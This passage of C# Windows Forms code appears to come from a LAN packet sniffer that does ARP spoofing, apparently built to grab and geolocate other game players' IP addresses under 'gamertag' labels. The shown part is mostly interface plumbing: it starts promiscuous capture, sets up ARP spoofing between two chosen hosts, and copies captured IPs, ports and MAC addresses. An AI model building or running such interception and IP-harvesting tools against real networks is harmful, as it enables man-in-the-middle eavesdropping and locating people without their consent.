                dataGridView2.DataSource = lmlist;
                dataGridView2.Columns["name"].HeaderText = "Computer Identifier (Name)";
                dataGridView2.Columns["name"].Width = 259;
                dataGridView2.Columns["IP"].HeaderText = "IP";
                dataGridView2.Columns["IP"].Width = 150;
                dataGridView2.Columns["macAddress"].HeaderText = "MAC Address";
                dataGridView2.Columns["macAddress"].Width = 150;
                dataGridView2.Columns["macVendor"].HeaderText = "Hardware Vendor";
                dataGridView2.Columns["macVendor"].Width = 150;
            }
            else
            {
                SetLMDSCallback setLMDSCallback = new SetLMDSCallback(SetLMDS);
                object[] objArray = new object[] { lmlist };
                base.Invoke(setLMDSCallback, objArray);
            }
        }
        private void SetText2(string text)
        {
            if (exitRequest)
            {
                Thread.CurrentThread.Abort();
            }
            else if (!logInNormalTextBox2.InvokeRequired)
            {
                logInNormalTextBox2.Text = text;
            }
            else
            {
                SetText2Callback setText2Callback = new SetText2Callback(SetText2);
                object[] objArray = new object[] { text };
                base.Invoke(setText2Callback, objArray);
            }
        }
        private void ShowContextMenu(Point p)
        {
            if (!contextMenuStrip1.InvokeRequired)
            {
                contextMenuStrip1.Show(dataGridView1, p);
            }
            else
            {
                ShowContextMenuCallback showContextMenuCallback = new ShowContextMenuCallback(ShowContextMenu);
                object[] objArray = new object[] { p };
                base.Invoke(showContextMenuCallback, objArray);
            }
        }
        private void ShowGroup5()
        {
            try
            {
                if (!logInGroupBox2.InvokeRequired)
                {
                    logInGroupBox2.Show();
                }
                else
                {
                    base.Invoke(new ShowGroup5Callback(ShowGroup5));
                }
            }
            catch
            {
            }
        }
        private string logInNormalTextBox1Text()
        {
            string text;
            try
            {
                if (!logInNormalTextBox1.InvokeRequired)
                {
                    text = logInNormalTextBox1.Text;
                }
                else
                {
                    logInNormalTextBox1TextCallback logInNormalTextBox1TextCallback = new logInNormalTextBox1TextCallback(logInNormalTextBox1Text);
                    text = (string)base.Invoke(logInNormalTextBox1TextCallback);
                }
            }
            catch
            {
                text = "";
            }
            return text;
        }
        private string logInNormalTextBox2Text()
        {
            string text;
            try
            {
                if (!logInNormalTextBox2.InvokeRequired)
                {
                    text = logInNormalTextBox2.Text;
                }
                else
                {
                    logInNormalTextBox2TextCallback logInNormalTextBox2TextCallback = new logInNormalTextBox2TextCallback(logInNormalTextBox2Text);
                    text = (string)base.Invoke(logInNormalTextBox2TextCallback);
                }
            }
            catch
            {
                text = "";
            }
            return text;
        }
        private string logInNormalTextBox3Text()
        {
            string text;
            try
            {
                if (!logInNormalTextBox3.InvokeRequired)
                {
                    text = logInNormalTextBox3.Text;
                }
                else
                {
                    TextBox4TextCallback textBox4TextCallback = new TextBox4TextCallback(logInNormalTextBox3Text);
                    text = (string)base.Invoke(textBox4TextCallback);
                }
            }
            catch
            {
                text = "";
            }
            return text;
        }
        private string logInNormalTextBox4Text()
        {
            string text;
            try
            {
                if (!logInNormalTextBox4.InvokeRequired)
                {
                    text = logInNormalTextBox4.Text;
                }
                else
                {
                    logInNormalTextBox4TextCallback logInNormalTextBox4TextCallback = new logInNormalTextBox4TextCallback(logInNormalTextBox4Text);
                    text = (string)base.Invoke(logInNormalTextBox4TextCallback);
                }
            }
            catch
            {
                text = "";
            }
            return text;
        }
        private void UpdateLocations(object sender, DoWorkEventArgs e)
        {
            while (running)
            {
                for (int i = 0; i < list.Count; i++)
                {
                    if ((list[i].GeoLocation == null ? true : list[i].GeoLocation.Contains("Reserved")))
                    {
                        try
                        {
                            string[] strArrays = IPLocator.IPLocation(list[i].ipDisplay.ToString());
                            list[i].GeoLocation = strArrays[2] + ", " + strArrays[1] + ", " + strArrays[0];
                        }
                        catch
                        {
                        }
                    }
                }
                RefreshGridIndex();
                Thread.Sleep(1000);
            }
        }
        private void refreshDBToolStripMenuItem_Click_1(object sender, EventArgs e)
        {
            listView1.Items.Clear();
            listView1.Sorting = SortOrder.None;
            RichTextBox TempDB = new RichTextBox();
            TempDB.Text = System.IO.File.ReadAllText(string.Concat(Environment.CurrentDirectory, "\\database.dat"));
            var items = new List<ListViewItem>();
            for (int i = TempDB.Lines.Count() - 1; i >= 0; i--)
            {
                try
                {
                    string[] Entry = TempDB.Lines[i].Split(new char[] { " "[0] });
                    ListViewItem item = new ListViewItem(TempDB.Lines[i].Replace(Entry[0], ""));
                    item.SubItems.Add(Entry[0]);
                    items.Add(item);
                }
                catch
                {
                }
            }
            listView1.BeginUpdate();
            listView1.Items.AddRange(items.ToArray());
            listView1.EndUpdate();
            listView1.Sorting = SortOrder.Ascending;
            listView1.Sort();
            listView1.Refresh();
        }
        private void logInCheckBox1_CheckedChanged(object sender)
        {
            if (!logInCheckBox1.Checked)
            {
                logInGroupBox2.Hide();
            }
            else
            {
                string str = myMacAddress;
                char[] chrArray = new char[] { ':' };
                if ((int)str.Split(chrArray).Length != 6)
                {
                    MessageBox.Show("Invalid MAC Address.  Possibly because the selected adapter is disabled.");
                    logInCheckBox1.Checked = false;
                }
                else
                {
                    System.Windows.Forms.Cursor.Current = Cursors.WaitCursor;
                    IPtoMac.Clear();
                    localIPs1.Clear();
                    localIPs2.Clear();
                    PacketDevice item = allDevices[DropdownIndex()];
                    communicator = item.Open(65536, PacketDeviceOpenAttributes.Promiscuous, 1);
                    BackgroundWorker backgroundWorker = new BackgroundWorker();
                    backgroundWorker.DoWork += new DoWorkEventHandler(ARPListen);
                    backgroundWorker.RunWorkerAsync();
                    BackgroundWorker backgroundWorker1 = new BackgroundWorker();
                    backgroundWorker1.DoWork += new DoWorkEventHandler(Send255ARPs);
                    backgroundWorker1.RunWorkerAsync();
                }
            }
        }
        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            running = false;
            if (isArpSpoofing)
            {
                if (isArpSpoofing)
                {
                    SendReverseArpPackets();
                }
                logInComboBox1.Enabled = true;
                logInGroupBox1.Enabled = true;
                logInGroupBox2.Enabled = true;
                logInCheckBox1.Enabled = true;
                logInCheckBox2.Enabled = true;
                mainThread.Abort();
                list = new BindingList<ListObject>();
                logInButton1.Text = "Start";
            }
            if (databaseChanged)
            {
                if (MessageBox.Show("Do you want to add changes to your database?", "Database", MessageBoxButtons.YesNo) == System.Windows.Forms.DialogResult.Yes)
                {
                    db.writeToFile(db.fileLocation);
                }
            }
            if ((mainThread == null ? false : mainThread.IsAlive))
            {
                mainThread.Abort();
            }
            base.Dispose();
        }
        private void logInComboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            char[] chrArray;
            bool length;
            bool flag = false;
            foreach (DeviceAddress address in allDevices[DropdownIndex()].Addresses)
            {
                if (address.Address == null || !(address.Address.Family.ToString() == "Internet"))
                {
                    length = true;
                }
                else
                {
                    string str = address.Address.ToString();
                    chrArray = new char[] { ' ' };
                    length = (int)str.Split(chrArray).Length <= 1;
                }
                if (!length)
                {
                    string str1 = address.Address.ToString();
                    chrArray = new char[] { ' ' };
                    machineIP = str1.Split(chrArray)[1];
                    flag = true;
                }
            }
            if (!flag)
            {
                SetText2("");
            }
            logInGroupBox1.Hide();
            logInGroupBox2.Hide();
            logInCheckBox1.Checked = false;
            logInCheckBox2.Checked = false;
            logInCheckBox1.Enabled = true;
            logInCheckBox2.Enabled = true;
            myMacAddress = GetMacAddress();
        }
        private void logInCheckBox2_CheckedChanged(object sender)
        {
            if (!logInCheckBox2.Checked)
            {
                logInGroupBox1.Hide();
            }
            else
            {
                logInGroupBox1.Show();
            }
        }
        private void logInButton1_Click(object sender, EventArgs e)
        {
            if (running)
            {
                if (isArpSpoofing)
                {
                    SendReverseArpPackets();
                }
                logInComboBox1.Enabled = true;
                logInGroupBox1.Enabled = true;
                logInGroupBox2.Enabled = true;
                logInCheckBox1.Enabled = true;
                logInCheckBox2.Enabled = true;
                running = false;
                mainThread.Abort();
                list = new BindingList<ListObject>();
                logInButton1.Text = "Start";
                logInButton2.Text = "Start";
            }
            else
            {
                if (!logInCheckBox1.Checked)
                {
                    isArpSpoofing = false;
                }
                else if ((DropdownValue2() == "" ? false : DropdownValue3() != ""))
                {
                    isArpSpoofing = true;
                    fromIP = DropdownValue2();
                    fromMac = IPtoMac[DropdownValue2()];
                    toIP = DropdownValue3();
                    toMac = IPtoMac[DropdownValue3()];
                }
                logInTabControl1.SelectedTab = ConnectionsTab;
                mainThread = new Thread(new ThreadStart(Listen));
                mainThread.Start();
                while (!mainThread.IsAlive)
                {
                }
                logInButton1.Text = "Stop";
                logInButton2.Text = "Stop";
                logInComboBox1.Enabled = false;
                logInGroupBox1.Enabled = false;
                logInGroupBox2.Enabled = false;
                logInCheckBox1.Enabled = false;
                logInCheckBox2.Enabled = false;
                running = true;
                BackgroundWorker backgroundWorker = new BackgroundWorker();
                backgroundWorker.DoWork += new DoWorkEventHandler(UpdateLocations);
                backgroundWorker.RunWorkerAsync();
            }
        }
        private void addLabelToolStripMenuItem_Click(object sender, EventArgs e)
        {
            LabelForm labelForm = new LabelForm(CurrentGT());
            if (labelForm.ShowDialog(this) == System.Windows.Forms.DialogResult.OK)
            {
                this.SetCurrentGT(labelForm.gamertag);
            }
            labelForm.Dispose();
        }
        private void copyIPToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                Clipboard.SetText(CurrentEXT());
            }
            catch
            {
            }
        }
        private delegate string CurrentEXTCallback();
        private string CurrentEXT()
        {
            string value = "";
            try
            {
                if (!dataGridView1.InvokeRequired)
                {
                    value = (string)dataGridView1.SelectedRows[0].Cells[2].Value;
                }
                else
                {
                    CurrentEXTCallback currentEXTCallback = new CurrentEXTCallback(CurrentEXT);
                    value = (string)base.Invoke(currentEXTCallback);
                }
            }
            catch
            {
                value = "Error";
            }
            return value;
        }
        private void copyLabelToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                Clipboard.SetText(CurrentLabel());
            }
            catch
            {
            }
        }
        private string CurrentLabel()
        {
            string value = "";
            try
            {
                if (!dataGridView1.InvokeRequired)
                {
                    value = (string)dataGridView1.SelectedRows[0].Cells[0].Value;
                }
                else
                {
                    CurrentLabelCallback currentLabelCallback = new CurrentLabelCallback(CurrentLabel);
                    value = (string)base.Invoke(currentLabelCallback);
                }
            }
            catch
            {
                value = "Error";
            }
            return value;
        }
        private void copyGeolocationToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                Clipboard.SetText(CurrentGeo());
            }
            catch
            {
            }
        }
        private delegate string CurrentGeoCallback();
        private string CurrentGeo()
        {
            string value = "";
            try
            {
                if (!dataGridView1.InvokeRequired)
                {
                    value = (string)dataGridView1.SelectedRows[0].Cells[1].Value;
                }
                else
                {
                    CurrentGeoCallback currentGeoCallback = new CurrentGeoCallback(CurrentGeo);
                    value = (string)base.Invoke(currentGeoCallback);
                }
            }
            catch
            {
                value = "Error";
            }
            return value;
        }
        private void copySourceIPToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                Clipboard.SetText(CurrentSIP());
            }
            catch
            {
            }
        }
        private delegate string CurrentSIPCallback();
        private string CurrentSIP()
        {
            string value = "";
            try
            {
                if (!dataGridView1.InvokeRequired)
                {
                    value = (string)dataGridView1.SelectedRows[0].Cells[4].Value;
                }
                else
                {
                    CurrentSIPCallback currentSIPCallback = new CurrentSIPCallback(CurrentSIP);
                    value = (string)base.Invoke(currentSIPCallback);
                }
            }
            catch
            {
                value = "Error";
            }
            return value;
        }
        private void copySourcePortToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
            Clipboard.SetText(CurrentSPO());
            }
            catch
            {
            }
        }
        private delegate string CurrentSPOCallback();
        private string CurrentSPO()
        {
            string value = "";
            try
            {
                if (!dataGridView1.InvokeRequired)
                {
                    value = (string)dataGridView1.SelectedRows[0].Cells[5].Value;
                }
                else
                {
                    CurrentSPOCallback currentSPOCallback = new CurrentSPOCallback(CurrentSPO);
                    value = (string)base.Invoke(currentSPOCallback);
                }
            }
            catch
            {
                value = "Error";
            }
            return value;
        }
        private void copyDestinationIPToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
            Clipboard.SetText(CurrentDIP());
            }
            catch
            {
            }
        }
        private delegate string CurrentDIPCallback();
        private string CurrentDIP()
        {
            string value = "";
            try
            {
                if (!dataGridView1.InvokeRequired)
                {
                    value = (string)dataGridView1.SelectedRows[0].Cells[6].Value;
                }
                else
                {
                    CurrentDIPCallback currentDIPCallback = new CurrentDIPCallback(CurrentDIP);
                    value = (string)base.Invoke(currentDIPCallback);
                }
            }
            catch
            {
                value = "Error";
            }
            return value;
        }
        private void copyDestinationPortToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
            Clipboard.SetText(CurrentDPO());
            }
            catch
            {
            }
        }
        private delegate string CurrentDPOCallback();
        private string CurrentDPO()
        {
            string value = "";
            try
            {
                if (!dataGridView1.InvokeRequired)
                {
                    value = (string)dataGridView1.SelectedRows[0].Cells[7].Value;
                }
                else
                {
                    CurrentDPOCallback currentDPOCallback = new CurrentDPOCallback(CurrentDPO);
                    value = (string)base.Invoke(currentDPOCallback);
                }
            }
            catch
            {
                value = "Error";
            }
            return value;
        }
        private void copyMACToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
            Clipboard.SetText(CurrentMAC());
            }
            catch
            {
            }
        }
        private delegate string CurrentMACCallback();
        private string CurrentMAC()
        {
            string value = "";
            try
            {
                if (!dataGridView1.InvokeRequired)
                {
                    value = (string)dataGridView1.SelectedRows[0].Cells[8].Value;
                }
                else
                {
                    CurrentMACCallback currentMACCallback = new CurrentMACCallback(CurrentMAC);
                    value = (string)base.Invoke(currentMACCallback);
                }
            }
            catch
            {
                value = "Error";
            }
            return value;
        }
        private void copyProtocolToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
            Clipboard.SetText(CurrentPRO());
            }
            catch
            {
            }
        }
        private delegate string CurrentPROCallback();
        private string CurrentPRO()
        {
            string value = "";
            try
            {
                if (!dataGridView1.InvokeRequired)
                {
                    value = (string)dataGridView1.SelectedRows[0].Cells[9].Value;
                }
                else
                {
                    CurrentPROCallback currentPROCallback = new CurrentPROCallback(CurrentPRO);
                    value = (string)base.Invoke(currentPROCallback);
                }
            }
            catch
            {
                value = "Error";
            }
            return value;
        }
        private void copyHWDVendorToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
            Clipboard.SetText(CurrentHWD());
            }
            catch
            {
            }
        }
        private delegate string CurrentHWDCallback();
        private string CurrentHWD()
        {
            string value = "";
            try
            {
                if (!dataGridView1.InvokeRequired)
                {
                    value = (string)dataGridView1.SelectedRows[0].Cells[10].Value;
                }
                else
                {
                    CurrentHWDCallback currentHWDCallback = new CurrentHWDCallback(CurrentHWD);
                    value = (string)base.Invoke(currentHWDCallback);
                }
            }
            catch
            {
                value = "Error";
            }
            return value;
        }
        private void copyPacketsNumberToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Clipboard.SetText(CurrentPCK());
        }
        private delegate string CurrentPCKCallback();
        private string CurrentPCK()
        {
            string value = "";
            try
            {
                if (!dataGridView1.InvokeRequired)
                {
                    value = (string)dataGridView1.SelectedRows[0].Cells[3].Value;
                }
                else
                {
                    CurrentPCKCallback currentPCKCallback = new CurrentPCKCallback(CurrentPCK);
                    value = (string)base.Invoke(currentPCKCallback);
                }
            }
            catch
            {
                value = "Error";
            }
            return value;
        }
        private void logInButton2_Click(object sender, EventArgs e)
        {
            if (running)
            {
                if (isArpSpoofing)
                {
                    SendReverseArpPackets();
                }
                logInComboBox1.Enabled = true;
                logInGroupBox1.Enabled = true;
                logInGroupBox2.Enabled = true;
                logInCheckBox1.Enabled = true;
                logInCheckBox2.Enabled = true;
                running = false;
                mainThread.Abort();
                list = new BindingList<ListObject>();
                logInButton1.Text = "Start";
                logInButton2.Text = "Start";
            }
            else
            {
                if (!logInCheckBox1.Checked)
                {
                    isArpSpoofing = false;
                }
                else if ((DropdownValue2() == "" ? false : DropdownValue3() != ""))
                {
                    isArpSpoofing = true;
                    fromIP = DropdownValue2();
                    fromMac = IPtoMac[DropdownValue2()];
                    toIP = DropdownValue3();
                    toMac = IPtoMac[DropdownValue3()];
                }
                logInTabControl1.SelectedTab = ConnectionsTab;
                mainThread = new Thread(new ThreadStart(Listen));
                mainThread.Start();
                while (!mainThread.IsAlive)
                {
                }
                logInButton1.Text = "Stop";
                logInButton2.Text = "Stop";
                logInComboBox1.Enabled = false;
                logInGroupBox1.Enabled = false;
                logInGroupBox2.Enabled = false;
                logInCheckBox1.Enabled = false;
                logInCheckBox2.Enabled = false;
                running = true;
                BackgroundWorker backgroundWorker = new BackgroundWorker();
                backgroundWorker.DoWork += new DoWorkEventHandler(UpdateLocations);
                backgroundWorker.RunWorkerAsync();
            }
        }
    }
}